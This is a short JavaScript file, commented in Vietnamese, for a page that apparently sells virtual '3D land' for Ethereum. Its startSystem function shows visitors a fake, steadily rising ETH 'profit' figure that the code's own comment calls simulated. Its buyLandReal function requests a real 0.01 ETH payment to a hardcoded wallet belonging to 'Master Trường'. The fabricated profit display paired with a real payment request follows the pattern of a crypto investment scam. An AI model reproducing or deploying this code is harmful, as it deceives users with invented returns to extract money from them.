// Cấu hình địa chỉ nhận tiền của Master Trường
const masterWallet = "0x539659a293E3094851212879685a2100A176962f"; 

// 1. Tạo hiệu ứng mảnh đất 3D ngay khi tải trang
const target = document.getElementById('hologram-target');
for (let i = 0; i < 200; i++) {
    const dot = document.createElement('div');
    dot.style.position = 'absolute';
    dot.style.width = '3px'; dot.style.height = '3px';
    dot.style.background = Math.random() > 0.5 ? '#00ffcc' : '#bc80ff';
    dot.style.left = Math.random() * 100 + '%';
    dot.style.top = Math.random() * 100 + '%';
    dot.style.transform = `translateZ(${Math.random() * 300 - 150}px)`;
    target.appendChild(dot);
}

// 2. Kích hoạt dòng tiền mô phỏng
function startSystem() {
    let profit = 0.03530;
    setInterval(() => {
        profit += 0.00012;
        document.getElementById('pulse').innerText = "LỢI NHUẬN: " + profit.toFixed(5) + " ETH";
        document.getElementById('pulse').style.color = "#00ffcc";
    }, 700);
    alert("ISOA-57: HỆ THỐNG SSCL ĐÃ KHAI HỎA!");
}

// 3. Xử lý giao dịch ETH thật
async function buyLandReal() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Yêu cầu mở ví
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            // Thực hiện lệnh chuyển tiền
            const tx = await signer.sendTransaction({
                to: masterWallet,
                value: ethers.utils.parseEther("0.01")
            });
            
            alert("GIAO GIAO DỊCH ĐANG ĐƯỢC XỬ LÝ TRÊN BLOCKCHAIN...");
            await tx.wait();
            alert("CHÚC MỪNG MASTER TRƯỜNG! 0.01 ETH ĐÃ ĐƯỢC CHUYỂN THÀNH CÔNG.");
        } catch (e) {
            alert("GIAO DỊCH BỊ HUỶ: " + e.message);
        }
    } else {
        alert("ISOA-57: KHÔNG TÌM THẤY VÍ SUBWALLET. HÃY CÀI ĐẶT ĐỂ TIẾP TỤC!");
    }
}